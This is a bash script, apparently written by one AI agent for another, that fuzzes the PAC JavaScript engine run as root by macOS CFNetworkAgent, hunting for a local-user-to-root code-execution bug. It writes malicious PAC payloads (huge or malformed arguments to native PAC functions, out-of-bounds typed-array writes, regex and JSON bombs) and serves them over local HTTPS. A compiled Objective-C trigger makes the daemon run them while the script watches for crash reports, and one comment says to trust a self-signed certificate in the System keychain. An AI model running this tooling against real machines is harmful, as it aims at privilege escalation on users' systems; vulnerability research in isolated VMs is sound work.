#!/bin/bash
# CFNetworkAgent root PAC-JavaScript engine fuzz — Claude-written for Codex. Run IN A VM (low panic risk, userland root
# daemon crash, but isolate). Target: /System/Library/Frameworks/CFNetwork.framework/.../CFNetworkAgent (ROOT,
# com.apple.cfnetwork.cfnetworkagent, JavaScriptCoreUseJIT=0). It fetches a client-specified PAC URL (HTTPS) and executes
# FindProxyForURL as ROOT. HYPOTHESIS: a JSC-interpreter or C-PAC-binding bug in that ROOT context = uid501->root
# code-exec (the "unauth" is by-design; the ROOT JS execution is the real surface). See
# ~/.claude/.../memory/lead_cfnetworkagent_root_pac_js_exec_378n.md
#
# Flow: (1) generate malicious .pac scripts stressing the PAC engine + bindings; (2) serve them over local HTTPS;
#       (3) as uid501, point a URLSession's connectionProxyDictionary at the PAC URL + make a request => CFNetworkAgent
#       (root) fetches + runs the PAC; (4) watch CFNetworkAgent for a crash (.ips in DiagnosticReports).
# ★ VM ONLY, not while user AFK.
set -u
DIR="$(cd "$(dirname "$0")" && pwd)"; PACDIR="$DIR/pacs"; mkdir -p "$PACDIR"
PORT=8443

# 1. PAC stress payloads — target the JS interpreter (JIT off) + the C PAC bindings (dnsResolve/isInNet/shExpMatch/...).
cat > "$PACDIR/gen.py" <<'PY'
import os
P=os.path.dirname(__file__)
def w(n,body): open(os.path.join(P,n),'w').write("function FindProxyForURL(url, host){\n%s\nreturn 'DIRECT';\n}\n"%body)
# C-binding arg abuse (huge/malformed args to the native PAC functions):
w("dnsResolve_huge.pac", "dnsResolve('A'.repeat(1000000));")
w("isInNet_malformed.pac","for(var i=0;i<100000;i++) isInNet(host, 'A'.repeat(64), '\\xff'.repeat(64));")
w("shExpMatch_evil.pac",  "shExpMatch(host, '['.repeat(100000));")
w("sortIp_huge.pac",      "sortIpAddressList('1.2.3.4;'.repeat(500000));")
w("dnsResolveEx_null.pac","dnsResolveEx(null); dnsResolveEx(); dnsResolveEx({});")
w("dateRange_args.pac",   "for(var i=0;i<50000;i++) dateRange(i,i,i,i,i,i,i);")
w("weekdayRange_evil.pac","weekdayRange('\\xff\\xff','\\x00',{});")
w("myIpAddressLeak.pac",  "var x=myIpAddress()+myIpAddressEx();")  # info-leak probe (interfaces)
# interpreter stress (JIT off => hit the interpreter/GC/allocator):
w("deep_recursion.pac",   "function r(n){return n<=0?0:r(n-1)+r(n-1);} r(100000);")
w("huge_string.pac",      "var s='A'; for(var i=0;i<32;i++) s=s+s; host=s;")
w("proto_pollution.pac",  "Object.prototype.__proto__={}; Array.prototype[0]=host; ({}).x;")
w("regex_catastroph.pac", "/^(a+)+$/.test('a'.repeat(100000)+'b');")
w("typed_array_oob.pac",  "var a=new Uint8Array(0x1000); a[0x41414141]=1; a.fill(host);")
w("json_bomb.pac",        "try{JSON.parse('['.repeat(1000000));}catch(e){}")
PY
python3 "$PACDIR/gen.py" && echo "[*] generated $(ls "$PACDIR"/*.pac | wc -l) PAC payloads"

# 2. local HTTPS server (self-signed). NOTE: CFNetworkAgent may require a TRUSTED cert for the PAC fetch — if the fetch
#    fails on cert, Codex: add the self-signed cert to the System keychain as trusted (VM), OR host the PAC on a real
#    HTTPS endpoint. "Unsupported PAC URL scheme - please use HTTPS" => HTTPS is mandatory (no file://).
CERT="$DIR/pac.pem"
[ -f "$CERT" ] || openssl req -x509 -newkey rsa:2048 -keyout "$CERT" -out "$CERT" -days 2 -nodes -subj "/CN=localhost" 2>/dev/null
echo "[*] starting HTTPS PAC server on :$PORT (VM). Codex: trust $CERT in System keychain if the fetch is rejected."
( cd "$PACDIR" && python3 - "$PORT" "$CERT" <<'PY' &
import sys,http.server,ssl,os
port=int(sys.argv[1]); cert=sys.argv[2]
os.chdir(os.path.dirname(os.path.abspath(cert))+"/pacs") if os.path.isdir("pacs") else None
h=http.server.SimpleHTTPRequestHandler
ctx=ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER); ctx.load_cert_chain(cert)
s=http.server.HTTPServer(('127.0.0.1',port),h); s.socket=ctx.wrap_socket(s.socket,server_side=True)
print("serving PACs over https://127.0.0.1:%d/"%port); s.serve_forever()
PY
) ; SRV=$!
sleep 1

# 3. the uid501 CLIENT trigger — set connectionProxyDictionary PAC URL + make a request (triggers CFNetworkAgent).
cat > "$DIR/trigger.m" <<'OBJC'
#import <Foundation/Foundation.h>
// as uid501: point a URLSession at a PAC URL => CFNetworkAgent(root) fetches+runs it.
int main(int c,char**v){ @autoreleasepool{
  if(c<2){fprintf(stderr,"usage: trigger https://127.0.0.1:8443/<name>.pac\n");return 2;}
  NSDictionary *proxy=@{ @"ProxyAutoConfigurationURL": [NSURL URLWithString:@(v[1])],
                         (NSString*)kCFNetworkProxiesProxyAutoConfigEnable:@YES };
  NSURLSessionConfiguration *cfg=[NSURLSessionConfiguration ephemeralSessionConfiguration];
  cfg.connectionProxyDictionary=proxy;
  NSURLSession *s=[NSURLSession sessionWithConfiguration:cfg];
  dispatch_semaphore_t sem=dispatch_semaphore_create(0);
  [[s dataTaskWithURL:[NSURL URLWithString:@"http://example.com/"] completionHandler:^(NSData*d,NSURLResponse*r,NSError*e){
     fprintf(stderr,"[+] request done (PAC executed by CFNetworkAgent as root). err=%s\n", e?e.localizedDescription.UTF8String:"none");
     dispatch_semaphore_signal(sem);
  }] resume];
  dispatch_semaphore_wait(sem,dispatch_time(DISPATCH_TIME_NOW,15LL*NSEC_PER_SEC));
  return 0; }}
OBJC
clang -fobjc-arc -framework Foundation "$DIR/trigger.m" -o "$DIR/trigger" 2>/dev/null || { echo "build trigger failed"; }

echo "[*] firing each PAC payload through CFNetworkAgent (watch for a crash .ips)"
before=$(ls /Library/Logs/DiagnosticReports/CFNetworkAgent* 2>/dev/null | wc -l)
for p in "$PACDIR"/*.pac; do
  n=$(basename "$p")
  echo "  -> $n"
  "$DIR/trigger" "https://127.0.0.1:$PORT/$n" 2>/dev/null
  sleep 0.5
done
after=$(ls /Library/Logs/DiagnosticReports/CFNetworkAgent* 2>/dev/null | wc -l)
kill $SRV 2>/dev/null
if [ "$after" -gt "$before" ]; then
  echo "  ★ CFNetworkAgent CRASHED (new .ips in DiagnosticReports) — a ROOT PAC-JSC bug. Identify the PAC, minimize, package."
else
  echo "  no CFNetworkAgent crash this round. Expand payloads (coverage-guided JSC PAC fuzzing) + verify the fetch reached the daemon (log stream --predicate 'process==\"CFNetworkAgent\"')."
fi
echo "== done. A CFNetworkAgent crash from a uid501-hosted PAC = uid501->root JSC finding. Do NOT count w/o the .ips. =="
